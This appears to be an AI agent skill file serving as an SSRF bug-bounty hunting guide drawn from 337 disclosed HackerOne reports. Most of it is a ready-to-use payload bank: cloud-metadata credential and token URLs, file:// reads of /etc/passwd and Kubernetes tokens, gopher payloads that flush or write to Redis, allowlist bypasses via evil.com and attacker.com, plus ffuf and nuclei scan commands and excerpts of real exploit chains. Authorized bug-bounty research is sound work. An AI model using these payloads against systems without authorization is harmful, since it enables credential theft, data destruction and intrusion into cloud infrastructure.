---
name: hackerone-ssrf
description: >-
  Hunt SSRF and server-side request primitives. Use when testing URL fetchers, webhooks, image importers, PDF generators, and integrations. Backed by 337 disclosed HackerOne reports.
---

# Server-Side Request Forgery (SSRF) — HackerOne field guide

Built from **337** publicly disclosed HackerOne reports (2014–2026). Corpus: `~/.local/share/hackerone-reports/`.

## Signal

- Reports: **337** · paid: **105**
- Median bounty **$700** · p90 **$4,263** · max **$25,000** · total **$178,859**
- Median upvotes **22**

## Where it pays

| Program | Reports | Bounty | Upvotes |
|---|---|---|---|
| HackerOne | 7 | $31,500 | 931 |
| Dropbox | 2 | $22,489 | 662 |
| GitLab | 18 | $19,750 | 1582 |
| Internet Bug Bounty | 7 | $16,043 | 217 |
| Mail.ru | 36 | $15,150 | 1549 |
| Open-Xchange | 15 | $10,250 | 396 |
| Lark Technologies | 5 | $8,000 | 539 |
| LY Corporation | 5 | $6,050 | 250 |

## Quick wins

Start here. These are the highest-yield tests for this class.

- Find server-side URL fetchers: webhooks, avatar/image import, link preview, PDF/render, RSS, OAuth metadata, import-from-URL.
- Confirm outbound traffic with a unique DNS/HTTP callback before trying internal targets.
- Test the response body, status code, timing, and error text for internal reachability.
- Check redirect-following: a trusted-domain open redirect can bypass host allowlists.
- Try non-HTTP schemes and protocols used by the backend (gopher, file, dict, ftp).

## Payloads & probes

- Cloud metadata -> `http://169.254.169.254/latest/meta-data/` `http://metadata.google.internal/computeMetadata/v1/`
- Loopback -> `http://127.0.0.1` `http://[::1]` `http://0x7f000001` `http://2130706433`
- Bypass form -> `http://169.254.169.254\@127.0.0.1:8000/` `http://127.1` `http://0177.0.0.1`
- Scheme abuse -> `file:///etc/passwd` `gopher://127.0.0.1:6379/_INFO` `dict://127.0.0.1:11211/stat`
- Redirect -> `https://trusted.com/redirect?url=http://169.254.169.254/`

## Payload bank

**85 curated payloads** in 6 context groups. Try them in order, stop at the first hit, then minimize. These are seeds, not a substitute for understanding the sink.

### Loopback & internal services

```text
http://127.0.0.1/
http://127.0.0.1:80/
http://localhost/
http://[::1]/
http://0.0.0.0/
http://127.1/
http://127.0.1/
http://2130706433/
http://0x7f000001/
http://0177.0.0.1/
http://127.0.0.1.nip.io/
http://127.0.0.1.sslip.io/
http://localtest.me/
http://[::ffff:127.0.0.1]/
http://[0:0:0:0:0:ffff:127.0.0.1]/
http://127.0.0.1:22/
http://127.0.0.1:6379/
http://127.0.0.1:11211/
http://127.0.0.1:9200/
http://127.0.0.1:8080/
http://127.0.0.1:3000/
http://127.0.0.1:8500/v1/catalog/services
```

### Cloud metadata

```text
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/dynamic/instance-identity/document
http://169.254.169.254/metadata/v1.json
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/openstack/latest/meta_data.json
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://100.100.100.200/latest/meta-data/
http://192.0.0.192/latest/meta-data/
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
http://metadata.google.internal/computeMetadata/v1/project/project-id
```

### Allowlist & parser bypass

```text
http://169.254.169.254\@127.0.0.1:8000/latest/meta-data/
http://127.0.0.1@169.254.169.254/
http://169.254.169.254#@127.0.0.1/
http://169.254.169.254%2f@127.0.0.1/
http://127.0.0.1:80@evil.com/
http://evil.com:80@127.0.0.1/
http://127.0.0.1%00.evil.com/
http://127.0.0.1%20.evil.com/
http://127.0.0.1.attacker.com/
http://attacker.com#@127.0.0.1/
http://attacker.com?@127.0.0.1/
http://127.0.0.1./
http://127.0.0.1:80\@evil.com/
//127.0.0.1/
\\127.0.0.1\
http://evil.com\@127.0.0.1/
http://127.0.0.1%09.evil.com/
http://127.0.0.1%0d%0a.evil.com/
```

### Redirect & DNS tricks

```text
http://attacker.com/redirect?url=http://169.254.169.254/
https://attacker.com/302?to=http://127.0.0.1/
http://attacker.com/open?next=http://metadata.google.internal/
http://127.0.0.1.nip.io/
http://169.254.169.254.nip.io/
http://metadata.google.internal.nip.io/
http://spoofed.burpcollaborator.net/
http://127.0.0.1.sslip.io/
http://localhost.localdomain/
http://localhost./
```

### Non-HTTP schemes

```text
file:///etc/passwd
file:///c:/windows/win.ini
file:///proc/self/environ
file:///var/run/secrets/kubernetes.io/serviceaccount/token
gopher://127.0.0.1:6379/_INFO
dict://127.0.0.1:11211/stat
ftp://127.0.0.1/
sftp://127.0.0.1/
ldap://127.0.0.1/
tftp://127.0.0.1/
netdoc:///etc/passwd
jar:http://127.0.0.1/x.jar!/
php://filter/convert.base64-encode/resource=index.php
expect://id
```

### Protocol smuggling (gopher / redis / memcached)

```text
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A
gopher://127.0.0.1:6379/_%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2433%0D%0A%0D%0A%0A%2A%2F%2A%20%2A%20%2A%20%2A%20%2A%20root%0D%0A
gopher://127.0.0.1:11211/_stats%0D%0A
gopher://127.0.0.1:11211/_set%20x%200%200%201%0D%0Aa%0D%0A
gopher://127.0.0.1:25/_EHLO%20localhost%0D%0A
gopher://127.0.0.1:3306/_
gopher://127.0.0.1:5432/_
gopher://127.0.0.1:9000/_
```

Copyable lists:
- `~/.local/share/hackerone-reports/wordlists/payloads_ssrf.txt` (85)
- `~/.local/share/hackerone-reports/wordlists/payloads_ssrf_waf.txt` (26 filter/WAF-focused)

## Bypass tricks

- Decimal/octal/hex IPs, IPv6-mapped addresses, and DNS names resolving to 127.0.0.1.
- DNS rebinding: resolve a controlled hostname to a public IP, then to 169.254.169.254.
- URL parser confusion with @, #, ?, backslashes, %09/%0d%0a, and userinfo.
- Allowlist suffix tricks: trusted.com.evil.com, evil.com#trusted.com, evil.com?trusted.com.
- Use open redirects on allowlisted hosts to reach internal targets.

## Where to look

Parameters, endpoints, and fields that commonly carry this bug:

`url` `uri` `link` `image` `avatar` `webhook` `callback` `feed` `proxy` `next` `dest` `host` `domain` `site` `fetch` `load`

## Tools

`interactsh` · `Burp Collaborator` · `ssrfmap` · `httpx` · `ffuf`

## Escalation chains

- Metadata -> cloud keys -> S3/account takeover.
- Internal admin panel -> RCE.
- Redis/Memcached via gopher -> RCE.

## Deeper checklist

- Find URL inputs: webhooks, avatars, imports, previews, PDF/render, RSS, OAuth metadata.
- Use a callback domain first to confirm outbound requests (DNS + HTTP).
- Test internal targets: 127.0.0.1, localhost, [::1], 169.254.169.254, RFC1918, internal hostnames.
- Bypass filters with decimal/octal/hex IPs, DNS rebinding, redirects, userinfo, and URL parsing quirks.
- Try non-HTTP schemes: gopher, file, dict, ftp, and cloud metadata endpoints.
- Check redirect-following and allowlist bypass via open redirects on trusted domains.
- Escalate to credential theft, internal API access, or port scanning with evidence.

## Techniques from real reports

One concrete lesson per report (mined from the writeup), newest and most-upvoted first. Read 5–10 before testing.

- **SSRF in Exchange leads to ROOT access in all instances** — `#341876` · Shopify · $0 · ▲587
  > However, I found really easy way to "bypass" it while reading the documentation: the `/v1beta1` endpoint is still available, does not require the `Metadata-Flavor: Google` header and still returns the same token.
- **Server-Side Request Forgery using Javascript allows to exfill data from Google Metadata** — `#530974` · Snapchat · $0 · ▲421
  > - Now hit `/api/v1/media/import` on `ads.snapchat.com`, with the URL parameter http://demon.███████/ssrf.html (or wherever you run it)
- **SSRF on project import via the remote_attachment_url on a Note** — `#826361` · GitLab · $10,000 · ▲359
  > A POST request is not possible here, but as `remote attachment request header=` is also available (https://github.com/carrierwaveuploader/carrierwave/blob/v1.3.1/lib/carrierwave/mount.rb L169) and not blacklisted, the payload could be set via a header.
- **Server Side Request Forgery mitigation bypass** — `#632101` · GitLab · $0 · ▲350
  > After the hook has executed, you should see content of `http://169.254.169.254` returned.
- **Blind SSRF to internal services in matrix preview_link API** — `#1960765` · Reddit · $6,000 · ▲344
  > Visit the https://matrix.redditspace.com/ matrix/media/r0/preview url/?url=
- **TURN server allows TCP and UDP proxying to internal network, localhost and meta-data services** — `#333419` · Slack · $3,500 · ▲323
  > UDP packets may be proxied by setting the `XOR-PEER-ADDRESS` to a private IP in the TURN send message indication (method `0x0006`, <https://tools.ietf.org/html/rfc5766 section-10 ).
- **SSRF  leaking internal google cloud data through upload function [SSH Keys, etc..]** — `#549882` · Vimeo · $0 · ▲276
  > For more information you can read my writeup: https://medium.com/@dPhoeniixx/vimeo-upload-function-ssrf-7466d8630437
- **Full read SSRF in www.evernote.com that can leak aws metadata and local file inclusion** — `#1189367` · Evernote · $0 · ▲264
  > The payload is base64 encoded of : `file:///home/abenavides/ .js`
- **SSRF in graphQL query (pwapi.ex2b.com)** — `#1864188` · EXNESS · $3,000 · ▲261
  > The query for `allTicks` allows setting the parameter `source` that is used to do `GET` requests, this can be set arbitrarily .
- **Unauthenticated blind SSRF in OAuth Jira authorization controller** — `#398799` · GitLab · $4,000 · ▲238
  > - send a `POST` request to the `/-/jira/login/oauth/callback` endpoint, as shown below.
- **Full Read SSRF on Gitlab's Internal Grafana** — `#878779` · GitLab · $0 · ▲229
  > On `secure.gravatar.com`, if you supply the `d` parameter, it allows for redirection to `i0.wp.com` where some of the images are hosted.
- **SSRF in webhooks leads to AWS private keys disclosure** — `#508459` · Omise · $0 · ▲214
  > As a result, it is possible to request a number of things, including AWS credentials on the metadata server located at `http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-opsworks-ec2-role`
- **Stored XSS & SSRF in Lark Docs** — `#892049` · Lark Technologies · $3,000 · ▲178
  > A stored XSS (cross site scripting) vulnerability was discovered in Lark Docs that could be escalated into a Server Side Request Forgery (SSRF) vulnerability if opened in a headless browser on the Lark server.
- **SSRF on duckduckgo.com/iu/** — `#398641` · DuckDuckGo · $0 · ▲165
  > `https://duckduckgo.com/iu/?u=http://127.0.0.1:6868%2fstatus%2f?q=http://yimg.com/` returns the following:
- **Server Side Request Forgery** — `#644238` · Lark Technologies · $0 · ▲164
  > https://jinone.github.io/bugbounty-a-simple-ssrf/
- **External SSRF and Local File Read via video upload due to vulnerable FFmpeg HLS processing** — `#1062888` · TikTok · $2,727 · ▲162
  > Make sure that your `header.m3u8` doesn't have anything after `3f` byte(`?` sign).
- **SSRF in Autodesk Rendering leading to account takeover** — `#3024673` · Autodesk · $0 · ▲161
  > A server side request forgery (SSRF) vulnerability was found in Autodesk Rendering, which could have allowed an attacker to send a malicious link to a victim and gain control of their account while logged in.
- **SSRF chained to hit internal host leading to another SSRF which allows to read internal images.** — `#826097` · PlayStation · $1,000 · ▲148
  > Using SSRF to open this URL: https://image.api.np.km.playstation.net/images/?format=png&image=https%3a//store.mgmt.playstation.com/store/api/chihiro/00 09 000/container/US/en/999/UP4134-CUSA00329 00-ONNTGAME00000001/1429722215000/image%3f version%3d00 09…
- **DNS Rebinding SSRF in Burp Suite MCP Server Enables Internal Network Access via send_http1_request Tool** — `#3176157` · PortSwigger Web Security · $0 · ▲144
  > Step2: Setup a DNS server for a domain that you controls that answers the first DNS request on this domain with the IP of a server he controls (in this example 192.168.80.154), and all other DNS requests with 127.0.0.1.
- **Blind SSRF on errors.hackerone.net due to Sentry misconfiguration** — `#374737` · HackerOne · $3,500 · ▲143
  > So I tried to simulate error report with malformed "filename" parameter and got callback on my website from 54.186.141.19 IP.
- **SSRF in https://couriers.indrive.com/api/file-storage** — `#2300358` · inDrive · $0 · ▲141
  > If you request any website like for example ` www.google.com `, ` https://couriers.indrive.com/api/file-storage?url=https://www.google.com `you will see its html content being displayed in the response
- **Server Side Request Forgery (SSRF) in webhook functionality** — `#2301565` · HackerOne · $2,500 · ▲140
  > It occurs when an attacker tricks a server into making requests on their behalf.
- **SSRF on music.line.me through getXML.php** — `#746024` · LY Corporation · $4,500 · ▲135
  > The reporter found an endpoint through which limited SSRF could be achieved.
- **SSRF In Get Video Contents** — `#643622` · Semrush · $0 · ▲125
  > I use URL: `https://1:@127.0.0.1:\@@@@w.youtube.com/@https://www.youtube.com/`, and the response is `{"status":404,"error":"Invalid url 'https:\/\/1:@127.0.0.1:\\@@@@w.youtube.com\/@https:\/www.youtube.com\/' (Status code 404)"}`.(PIC3)
- **Full read SSRF via Lark Docs `import as docs` feature** — `#1409727` · Lark Technologies · $5,000 · ▲124
  > A SSRF (server side request forgery) vulnerability was found in the LarkDocs using the "import as docs" feature, which could have potentially been used to access services running on the internal network.
- **Blind SSRF on https://my.exnessaffiliates.com/ allows for internal network enumeration** — `#1832494` · EXNESS · $0 · ▲120
  > `https://my.exnessaffiliates.com/api/partner integrations/template/probe`
- **Server-Side Request Forgery (SSRF) via Game Export API** — `#3165242` · Lichess · $0 · ▲116
  > Make a request to: `/game/export/[GAME ID]?players=http://169.254.169.254/latest/meta-data/ `
- **SSRF on image renderer** — `#811136` · PlayStation · $1,000 · ▲103
  > image.api.np.km.playstation.net allows image urls to be passed via the `image` parameter
- **Header modification results in disclosure of Slack infra metadata to unauthorized parties** — `#727330` · Slack · $0 · ▲97
  > So, with the blind SSRF vulnerability, the attackers can send arbitrary requests to the intranet, ex: port scanning by identifying the response delay time, to know 169.265.169.254:443 is closed, 169.265.169.254:80 is opened...and so on.
- **[my.stripo.email] Blind SSRF Vulnerability in Stripo App Export via Missing Endpoints Export Email Message to Zapier** — `#2932960` · Stripo Inc · $0 · ▲92
  > The vulnerability exists in the endpoint `/exportservice/v3/exports/WEBHOOK/accounts`.

## Payload fragments observed

Recurring payloads from this class's writeups. Adapt, don't paste blindly.

| Seen | Fragment |
|---:|---|
| 4× | `http://[fe80::1%25eth0]/` |
| 4× | `fe80::1%eth0` |
| 3× | `(scheme, hostname, port)` |
| 2× | `https://<your-attacker-server>/redir.php` |
| 2× | `RealPlayerApi.apply()` |
| 2× | `http://169.254.169.254\@127.0.0.1:8000/latest/meta-data/` |
| 2× | `{readapi.<url_here>}` |
| 2× | `http.<url>.proxy` |
| 2× | `..%2F..%2Fapi/v0/shutdown` |
| 2× | `%2F` |
| 2× | `fe80::1%1` |
| 2× | `%eth0` |
| 2× | `Unknown mime-type: text/html; charset=UTF-8` |
| 2× | `Curl_idn_decode()` |
| 2× | `$('.upgradeToAdmin').click(function () { / let t = $('input[name="username"]').val(); / $.get('/admin/upgrade?username=' + t, function () {` |
| 2× | `POST /hate-mail-generator/new/preview HTTP/1.1 / Host: hackyholidays.h1ctf.com / ...... / preview_markup=Hello,{{name}}&preview_data={"name` |
| 2× | `{{}}` |
| 1× | `<script> / window.location="http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token"; / // iframes d` |
| 1× | `<script> / window.location="http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json"; / </script>` |
| 1× | `curl -X POST "https://www.googleapis.com/compute/v1/projects/███/setCommonInstanceMetadata" -H "Authorization: Bearer ██████████████" -H "Co` |

## Parameters observed

`url` · `hash` · `username` · `template` · `password` · `id` · `data` · `payload` · `alt` · `format` · `email` · `month` · `year` · `template[]` · `image` · `name` · `target` · `start` · `command` · `user_id`

## Case studies

### SSRF in Exchange leads to ROOT access in all instances
`#341876` · Shopify · $0 · medium · 2018-05-23 · ▲587
> The Exploit Chain - How to get root access on all Shopify instances 1 - Access Google Cloud Metadata - 1: Create a store (partners.shopify.com) - 2: Edit the template password.liquid and add the following content: - 3: Go to https://exchange.shopify.com/create-a-listing and install the Exchange app - 4: Wait for the store screenshot to appear on the Create Listing page - 5: Download the PNG and open it using image editing software or convert it to JPEG…

### Server Side Request Forgery (SSRF) via Analytics Reports
`#2262382` · HackerOne · $25,000 · critical · 2023-12-08 · ▲529
> Hello Gents, I would like to report an issue where attackers are able to read internal files via an SSRF vulnerability. Proof of concept + ███ Impact SSRF. Thanks and have a nice day!

### Server-Side Request Forgery using Javascript allows to exfill data from Google Metadata
`#530974` · Snapchat · $0 · n/a · 2020-11-30 · ▲421
> Hey there, I was looking at your ads site with @daeken, we found some weird behavior in the import function of the creative app. Here are the steps: POC - Login to https://business.snapchat.com/ - Go to creative library - New Creative - Under "Topsnap Media", click on "Create" - Click on any of the templates and load it - Click on one of the images in the template - Replace - Import - This is where the SSRF exists .

### SSRF on project import via the remote_attachment_url on a Note
`#826361` · GitLab · $10,000 · high · 2020-06-07 · ▲359
> The Note model has an attachment which is provided by a CarrierWave uploader: One of the features this provides is the ability to download and attach a file via a url, see https://github.com/carrierwaveuploader/carrierwave/blob/v1.3.1/lib/carrierwave/mount.rb L80. This means that the Note model has a method remote attachment url= which can be used to perform this action.

### Server Side Request Forgery mitigation bypass
`#632101` · GitLab · $0 · high · 2020-04-18 · ▲350
> This vulnerability allows attacker to send arbitrary requests to local network which hosts GitLab and read the response. This is possible due to flawed DNS rebinding protection. The attack is possible due to flaw here: https://gitlab.com/gitlab-org/gitlab-ce/blob/108c3cf16bed5733ffae086fb62c226961356560/lib/gitlab/url blocker.rb L59 The validate function performs DNS lookup to check whether the IP address of a domain belongs to the local network.

## Wordlists

Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.

| File | Entries |
|---|---:|
| `~/.local/share/hackerone-reports/wordlists/paths_ssrf.txt` | 150 |
| `~/.local/share/hackerone-reports/wordlists/params_ssrf.txt` | 150 |
| `~/.local/share/hackerone-reports/wordlists/payloads_ssrf.txt` | 85 |
| `~/.local/share/hackerone-reports/wordlists/payloads_ssrf_waf.txt` | 26 |
| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |
| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |

```sh
W=~/.local/share/hackerone-reports/wordlists
ffuf -u https://target/FUZZ -w $W/paths_ssrf.txt \
     -mc all -fc 404 -fs 0 -rate 40
ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_ssrf.txt \
     -mr 'canary|error|invalid|not found' -rate 40
ffuf -u 'https://target/api?<param>=FUZZ' -w $W/payloads_ssrf.txt \
     -mr '<hit-marker>' -rate 20
```

## Nuclei

Set up an interactsh/OAST listener first; SSRF templates often only prove outbound traffic.

```sh
nuclei -u https://target -tags ssrf,oast \
       -severity low,medium,high,critical -rl 40 -o nuclei_ssrf.txt
nuclei -u https://target -t ~/nuclei-templates/dast/vulnerabilities/ssrf -dast \
       -rl 40 -o nuclei_ssrf_ssrf.txt
nuclei -u https://target -t ~/nuclei-templates/http/fuzzing/ssrf-via-proxy.yaml \
       -rl 40 -o nuclei_ssrf_ssrf-via-proxy.txt
# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'
```

Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.

## Query the corpus

```sh
python3 ~/.local/share/hackerone-reports/h1.py search "<keyword>" --class ssrf --limit 20
python3 ~/.local/share/hackerone-reports/h1.py stats --class ssrf
python3 ~/.local/share/hackerone-reports/h1.py show <id> --full
```

Search by technology, endpoint, parameter, or program. Examples:

```sh
python3 ~/.local/share/hackerone-reports/h1.py search "wordpress" --class ssrf
python3 ~/.local/share/hackerone-reports/h1.py search "reset token" --class ssrf --min-bounty 1000
```

## Related

- `hackerone-open-redirect` (385 reports)
- `hackerone-rce` (1,399 reports)
- `hackerone-info-disclosure` (1,827 reports)

## Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.
